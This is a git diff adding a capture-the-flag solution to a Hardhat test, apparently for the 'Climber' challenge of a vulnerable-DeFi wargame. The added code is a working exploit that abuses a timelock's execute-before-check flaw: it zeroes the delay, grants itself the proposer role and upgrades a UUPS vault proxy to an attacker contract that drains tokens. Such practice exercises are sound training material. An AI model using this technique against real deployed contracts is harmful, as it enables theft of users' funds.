@@ -53,6 +53,49 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // deploy the malImp first
+        const malImp = await (await ethers.getContractFactory('ClimberAttacker', attacker)).deploy();
+
+        // lots of encode works,so we put all abi in this interface
+        const iface = new ethers.utils.Interface([
+            // timelock interface
+            'function updateDelay(uint64 newDelay)',
+            'function grantRole(bytes32 role, address account)',
+
+            // uups interface
+            'function upgradeToAndCall(address newImplementation, bytes memory data) payable',
+
+            // attacker interfce
+            'function attack(address token)'
+        ]) 
+        const targets = [
+            this.timelock.address,
+            this.timelock.address,
+            this.vault.address
+        ];
+        const values = [0,0,0];
+
+        const proposerRole = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('PROPOSER_ROLE'));
+        const upgradeCalldata = iface.encodeFunctionData('attack', [this.token.address]);
+        // console.log('attack:',upgradeCalldata);
+
+        const dataElements = [
+            iface.encodeFunctionData('updateDelay', [0]),
+            iface.encodeFunctionData('grantRole', [proposerRole, this.vault.address]),
+            iface.encodeFunctionData('upgradeToAndCall', [malImp.address, upgradeCalldata]),
+        ];
+       
+        const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('I am the Attacker'));
+
+        const tx = await this.timelock.connect(attacker).execute(targets,values,dataElements,salt);
+        await tx.wait();
+
+        // this part is used to generate encode data used in the ClimberAttacker Contract
+        // const iface2 = new ethers.utils.Interface([
+        //     'function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)', 
+        // ])
+        // const edata = iface2.encodeFunctionData('schedule',[targets,values,dataElements,salt]);
+        // console.log('schedule edata:', edata);
     });
 
     after(async function () {
